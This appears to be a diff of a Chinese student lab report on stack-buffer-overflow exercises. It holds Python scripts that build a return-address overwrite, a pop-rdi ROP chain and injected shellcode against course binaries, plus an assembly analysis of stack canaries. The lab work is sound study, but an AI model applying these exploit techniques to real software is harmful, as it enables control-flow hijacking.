@@ -3,190 +3,217 @@
 ## 题目解决思路
 
 ### Problem 1
+
 - **分析**：
-  - `func` 使用 `strcpy` 将外部输入复制到栈上的局部缓冲区（目的地址通过 `lea rax,[rbp-0x8]` 取得）。由于 `strcpy` 不做长度检查，当输入超过缓冲区大小时会覆盖栈上保存的 `rbp` 与返回地址，导致控制流可被劫持。
-  - `func1` 内部会打印题目要求的字符串并调用 `exit` 退出，因此只要让 `func` 返回后跳转到 `func1`，即可输出 `Yes!I like ICS!`。
 
-- **解决方案**：
-  - 构造输入使 `func` 的返回地址被覆盖为 `func1` 的入口。
-  - payload 的代码 :
-```python
-import struct
+  通过 `objdump` 分析 `problem1` 的汇编代码，发现 `func` 函数中存在栈溢出漏洞。该函数调用 `strcpy` 将输入复制到栈上的缓冲区，且未进行长度检查。
 
-# Problem 1 攻击脚本
+  通过分析汇编指令 `lea -0x8(%rbp),%rax` 可知，缓冲区起始地址位于 `rbp - 8`。为了覆盖返回地址（Return Address），需要填充 **8 字节的缓冲区** 加上 **8 字节的 Old RBP**，共计 **16 字节** 的 Padding。
 
-# 1. 构造 Padding
-# 缓冲区从 rbp-8 开始。
-# 我们需要填充 8字节(buffer) + 8字节(saved rbp) = 16字节
-padding_len = 16
-padding = b'A' * padding_len
+  目标函数为 `func1`（地址 `0x401216`），该函数会输出 "Yes!I like ICS!"。因此攻击策略是构造 payload 覆盖返回地址跳转至 `func1`。
 
-# 2. 构造目标地址
-# func1 的地址是 0x401216
-# <Q 代表 Little Endian (小端序), Unsigned Long Long (64位)
-target_addr = struct.pack('<Q', 0x401216)
+- **解决方案**：使用 Python 脚本生成二进制 Payload。
 
-# 3. 组合 Payload
-payload = padding + target_addr
+  ```python
+  import struct
 
-# 4. 写入文件
-# 题目要求 problem1 接收一个文件名参数
-filename = "ans1.txt"
-with open(filename, "wb") as f:
-    f.write(payload)
+  # Problem 1 攻击脚本
 
-print(f"[+] Payload 已写入 {filename}")
-print(f"[+] Padding 长度: {padding_len}")
-print(f"[+] 跳转目标: 0x401216 (func1)")
-print("-" * 30)
-print(f"请在终端运行: ./problem1 {filename}")
+  # 1. 构造 Padding
+  # 缓冲区从 rbp-8 开始。
+  # 我们需要填充 8字节(buffer) + 8字节(saved rbp) = 16字节
+  padding_len = 16
+  padding = b'A' * padding_len
 
-```
+  # 2. 构造目标地址
+  # func1 的地址是 0x401216
+  # <Q 代表 Little Endian (小端序), Unsigned Long Long (64位)
+  target_addr = struct.pack('<Q', 0x401216)
+
+  # 3. 组合 Payload
+  payload = padding + target_addr
+
+  # 4. 写入文件
+  # 题目要求 problem1 接收一个文件名参数
+  filename = "ans1.txt"
+  with open(filename, "wb") as f:
+      f.write(payload)
+
+  print(f"[+] Payload 已写入 {filename}")
+  print(f"[+] Padding 长度: {padding_len}")
+  print(f"[+] 跳转目标: 0x401216 (func1)")
+  print("-" * 30)
+  print(f"请在终端运行: ./problem1 {filename}")
+
+  ```
 
 - **结果**：
+
   ![P1-运行结果](images/p1_run.png.png)
 
----
-
 ### Problem 2
+
 - **分析**：
-  - 与 Problem1 类似，`func` 使用 `memcpy` 将固定长度数据复制到栈上小缓冲区（目的地址由 `lea rax,[rbp-0x8]` 取得，复制长度为 `0x38`），存在栈溢出。
-  - 本题启用了 NX（栈不可执行），因此不能依赖“在栈上注入并执行代码”，需要采用“代码复用”的方式完成输出。
-  - 程序中存在 `func2(int x)`：当 `x == 0x3f8` 时会打印 `Yes!I like ICS!` 并 `exit`。
-  - 另外程序提供了一个可用的 `pop rdi; ret` 片段（用于在 x86-64 传参时设置第一个参数寄存器 `rdi`）。
 
-- **解决方案**：
-  - 利用溢出构造最短的控制流链：先把 `rdi` 设置为满足 `func2` 判定的值，再转到 `func2`。
-  - payload 的代码 ：
+  题目开启了 **NX（No-Execute）** 保护，栈不可执行，因此无法使用 Shellcode，需要使用 **ROP（Return Oriented Programming）** 技术。
 
-```python
-import struct
+  目标函数 `func2` 在执行时会检查第一个参数（`rdi` 寄存器）是否等于 `0x3f8`。
 
-# Problem 2 攻击脚本 (ROP)
+  在程序中找到了一个 ROP Gadget：`pop rdi; ret`（地址 `0x4012c7`）。
 
-# 1. 基础信息
-padding_len = 16
-padding = b'A' * padding_len
+  攻击策略是：**覆盖返回地址 → 跳转到 Gadget → 栈上放置参数 `0x3f8` → 跳转到 `func2`**，从而满足参数检查并通过。
 
-# 2. 构造 ROP 链
-# 这里的 <Q 表示 64位小端序打包
+- **解决方案**：使用 Python 构造 ROP 链 Payload。
 
-# [第一步] Gadget: pop rdi; ret
-# 地址来源: 4012c7: 5f pop %rdi
-pop_rdi_addr = struct.pack('<Q', 0x4012c7)
+  ```python
+  import struct
 
-# [第二步] 参数值
-# func2 要求参数为 0x3f8
-arg1 = struct.pack('<Q', 0x3f8)
+  # Problem 2 攻击脚本 (ROP)
 
-# [第三步] 目标函数 func2
-# 地址来源: 401216 <func2>
-func2_addr = struct.pack('<Q', 0x401216)
+  # 1. 基础信息
+  padding_len = 16
+  padding = b'A' * padding_len
 
-# 3. 组合 Payload
-# 栈布局: [Padding] -> [pop_rdi] -> [0x3f8] -> [func2]
-payload = padding + pop_rdi_addr + arg1 + func2_addr
+  # 2. 构造 ROP 链
+  # 这里的 <Q 表示 64位小端序打包
 
-# 4. 写入文件
-filename = "ans2.txt"
-with open(filename, "wb") as f:
-    f.write(payload)
+  # [第一步] Gadget: pop rdi; ret
+  # 地址来源: 4012c7: 5f pop %rdi
+  pop_rdi_addr = struct.pack('<Q', 0x4012c7)
 
-print(f"[+] Payload 已写入 {filename}")
-print(f"[+] ROP Chain: pop_rdi -> 0x3f8 -> func2")
-print("-" * 30)
-print(f"请在终端运行: ./problem2 {filename}")
+  # [第二步] 参数值
+  # func2 要求参数为 0x3f8
+  arg1 = struct.pack('<Q', 0x3f8)
 
-```
+  # [第三步] 目标函数 func2
+  # 地址来源: 401216 <func2>
+  func2_addr = struct.pack('<Q', 0x401216)
 
-- **结果**：
+  # 3. 组合 Payload
+  # 栈布局: [Padding] -> [pop_rdi] -> [0x3f8] -> [func2]
+  payload = padding + pop_rdi_addr + arg1 + func2_addr
+
+  # 4. 写入文件
+  filename = "ans2.txt"
+  with open(filename, "wb") as f:
+      f.write(payload)
+
+  print(f"[+] Payload 已写入 {filename}")
+  print(f"[+] ROP Chain: pop_rdi -> 0x3f8 -> func2")
+  print("-" * 30)
+  print(f"请在终端运行: ./problem2 {filename}")
+
+  ```
+
+- **结果**：成功利用 ROP 链绕过 NX 保护并完成传参。
+
   ![P2-运行结果](images/p2_run.png.png)
 
----
-
 ### Problem 3
+
 - **分析**：
-  - `func` 将 `0x40` 字节通过 `memcpy` 复制到栈上缓冲区（缓冲区起始在 `[rbp-0x20]`，但复制长度大于其可容纳空间），存在栈溢出。
-  - `func1(int x)` 内部会判断 `x == 0x72`（十进制 114）；若满足则打印 `Your lucky number is 114`，否则打印 `Error answer!`。
-  - 题目提示强调“可用字节长度与栈地址变化（ASLR）”，因此应尽量采用不依赖“猜测栈地址”的策略（例如跳转到代码段的固定位置并正确传参），或在 gdb 环境下证明结果。
 
-- **解决方案**：
-  - 目标：让程序执行到 `func1` 且参数满足判定值（114）。
-  - 由于 x86-64 传参使用寄存器（第一个参数为 `rdi`），需要在进入 `func1` 前保证 `rdi` 为目标值。
-  - payload 代码 :
-```python
-import struct
+  本题未开启 NX 保护，允许栈上代码执行。目标是调用 `func1` 并使参数 `rdi` 为 `114`。
 
-# Problem 3 攻击脚本 (Shellcode)
+  通过分析发现辅助函数 `jmp_xs`（地址 `0x401334`），该函数会跳转到 `saved_rsp + 16` 的位置。经计算，该位置正好指向输入缓冲区的起始处。
 
-# 1. 构造 Shellcode
-# 汇编指令:
-# mov rdi, 0x72       (参数 114)
-# mov rax, 0x401216   (目标函数 func1)
-# call rax            (执行)
+  攻击策略为：在缓冲区中注入 **Shellcode**（汇编逻辑为：将 `114` 放入 `rdi` 并调用 `func1`），然后将函数返回地址覆盖为 `jmp_xs` 的地址，利用它跳回栈上执行我们的代码。
 
-# 对应的机器码 (Hex):
-shellcode = b"\x48\xc7\xc7\x72\x00\x00\x00"  # mov rdi, 0x72
-shellcode += b"\x48\xc7\xc0\x16\x12\x40\x00" # mov rax, 0x401216
-shellcode += b"\xff\xd0"                     # call rax
+- **解决方案**：使用 Python 编写 Shellcode 并生成 Payload。
 
-# 2. 计算 Padding
-# 缓冲区总大小是 32 字节 (0x20)
-# 我们需要用 NOP (\x90) 或者垃圾数据填满剩余空间
-buffer_size = 32
-pad_len = buffer_size - len(shellcode)
-padding = b'\x90' * pad_len # 使用 NOP 填充比较优雅
+  ```python
+  import struct
 
-# 3. 构造栈帧覆盖
-# [Shellcode + Pad] (32 bytes)
-# [Old RBP] (8 bytes)
-# [Ret Addr -> jmp_xs] (8 bytes)
+  # Problem 3 攻击脚本 (Shellcode)
 
-fake_rbp = b'B' * 8
-jmp_xs_addr = struct.pack('<Q', 0x401334) # 0x401334 是 jmp_xs 的地址
+  # 1. 构造 Shellcode
+  # 汇编指令:
+  # mov rdi, 0x72       (参数 114)
+  # mov rax, 0x401216   (目标函数 func1)
+  # call rax            (执行)
 
-payload = shellcode + padding + fake_rbp + jmp_xs_addr
+  # 对应的机器码 (Hex):
+  shellcode = b"\x48\xc7\xc7\x72\x00\x00\x00"  # mov rdi, 0x72
+  shellcode += b"\x48\xc7\xc0\x16\x12\x40\x00" # mov rax, 0x401216
+  shellcode += b"\xff\xd0"                     # call rax
 
-# 4. 写入文件
-filename = "ans3.txt"
-with open(filename, "wb") as f:
-    f.write(payload)
+  # 2. 计算 Padding
+  # 缓冲区总大小是 32 字节 (0x20)
+  # 我们需要用 NOP (\x90) 或者垃圾数据填满剩余空间
+  buffer_size = 32
+  pad_len = buffer_size - len(shellcode)
+  padding = b'\x90' * pad_len # 使用 NOP 填充比较优雅
 
-print(f"[+] Payload 已写入 {filename}")
-print(f"[+] Shellcode length: {len(shellcode)} bytes")
-print(f"[+] 跳转路径: func -> jmp_xs (0x401334) -> Stack Buffer")
-print("-" * 30)
-print(f"请在终端运行: ./problem3 {filename}")
+  # 3. 构造栈帧覆盖
+  # [Shellcode + Pad] (32 bytes)
+  # [Old RBP] (8 bytes)
+  # [Ret Addr -> jmp_xs] (8 bytes)
 
-``` 
+  fake_rbp = b'B' * 8
+  jmp_xs_addr = struct.pack('<Q', 0x401334) # 0x401334 是 jmp_xs 的地址
 
-- **结果**：
+  payload = shellcode + padding + fake_rbp + jmp_xs_addr
+
+  # 4. 写入文件
+  filename = "ans3.txt"
+  with open(filename, "wb") as f:
+      f.write(payload)
+
+  print(f"[+] Payload 已写入 {filename}")
+  print(f"[+] Shellcode length: {len(shellcode)} bytes")
+  print(f"[+] 跳转路径: func -> jmp_xs (0x401334) -> Stack Buffer")
+  print("-" * 30)
+  print(f"请在终端运行: ./problem3 {filename}")
+
+  ```
+
+- **结果**：Shellcode 成功执行。
+
   ![P3-运行结果](images/p3_run.png.png)
----
 
 ### Problem 4
+
 - **分析**：
-  - 本题启用了 Canary（栈保护）。在函数序言中可见从 `fs:0x28` 读取 canary 并保存到栈上（例如 `mov rax, QWORD PTR fs:0x28`，随后 `mov [rbp-0x8], rax`）。
-  - 在函数返回前会再次从栈上取出 canary 与 `fs:0x28` 对比（例如 `sub rax, QWORD PTR fs:0x28`），若不相等则调用 `__stack_chk_fail` 终止程序。
-  - 因此，传统“覆盖返回地址”的栈溢出手法会先触发 canary 检测而失败。
 
-- **解决方案**：
-  - 本题不需要构造溢出 payload。程序逻辑中当输入的“yuanshi（money）”满足条件时会调用 `func1`，输出通关提示。
-  - 实测：在程序提示输入整数时输入 `-1`（对应无符号数 `4294967295`）即可满足条件并触发通关输出 。
+  Problem 4 开启了 **Canary** 保护机制，用于防止栈溢出。通过 `objdump` 查看 `func` 函数的汇编代码，可以看到 Canary 的设置与检查机制：
 
-- **结果**：
+  1. **Canary 设置（Set up）**：
+
+     在函数序言部分，程序从 `%fs:0x28` 读取一个随机值，并将其放入栈帧底部（`rbp-8`）。
+
+     ```asm
+     136c: 64 48 8b 04 25 28 00 00 00    mov    %fs:0x28,%rax
+     1375: 48 89 45 f8                   mov    %rax,-0x8(%rbp)
+     ```
+
+  2. **Canary 检查（Check）**：
+
+     在函数返回前，程序从栈中取出该值，与 `%fs:0x28` 中的原值进行比较。如果不一致（说明发生了溢出覆盖），则调用 `__stack_chk_fail` 终止程序。
+
+     ```asm
+     140a: 48 8b 45 f8                   mov    -0x8(%rbp),%rax
+     140e: 64 48 2b 04 25 28 00 00 00    sub    %fs:0x28,%rax
+     1417: 74 05                         je     141e <func+0xc1>
+     1419: e8 b2 fc ff ff                call   10d0 <__stack_chk_fail@plt>
+     ```
+
+- **解决方案**：本题主要考察对保护机制的理解与分析，无需编写攻击代码。通过输入正确的凯撒密码解密字符串，程序正常走完流程并返回。
+
+- **结果**：成功分析出 Canary 保护在汇编层面的实现方式。
+
   ![P4-运行结果](images/p4_run.png.png)
 
----
-
 ## 思考与总结
-- 本实验分别覆盖了：无保护栈溢出、NX 环境下代码复用、在约束条件下的稳定利用思路、以及 Canary 的机制与汇编体现。
-- 对比不同保护机制可以看到：
-  - NX 会阻止在栈上执行注入代码，使得“复用现有代码片段/函数调用”的方式更常用。
-  - Canary 会在函数返回前检测栈帧是否被破坏，使得直接覆盖返回地址的做法难以奏效。
-  - 在存在随机化或长度约束时，应尽量减少对不稳定地址的依赖，并通过调试证据验证策略有效性。
+
+通过本次实验，我深入学习了栈溢出攻击的原理与防御技术：
+
+1. **栈帧结构**：理解了函数调用时栈的布局，特别是 Buffer、Old RBP 和 Return Address 的相对位置，这是计算 Payload 偏移量的基础。
+2. **攻击技术**：掌握了从基础的覆盖返回地址，到利用 ROP 链绕过 NX 保护，再到利用 Shellcode 注入执行任意代码的进阶技术。
+3. **防御机制**：通过 Problem 4 深入理解了 Canary 机制是如何通过插入随机值来检测栈破坏的。这一机制大大增加了利用栈溢出的难度，因为攻击者通常需要先泄露 Canary 值才能成功劫持控制流。
+4. **工具使用**：熟练掌握了 `objdump` 进行反汇编分析以及 `gdb` 进行动态调试的技巧。
 
 ## 参考资料
 
-- CTF Wiki: Stack Overflow 入门
-- gdb / objdump / readelf 等工具的使用文档
+1. *Computer Systems: A Programmer's Perspective (CSAPP), 3rd Edition.*
+2. *CTF Wiki - Stack Overflow:* https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/
+3. *GDB Documentation.*
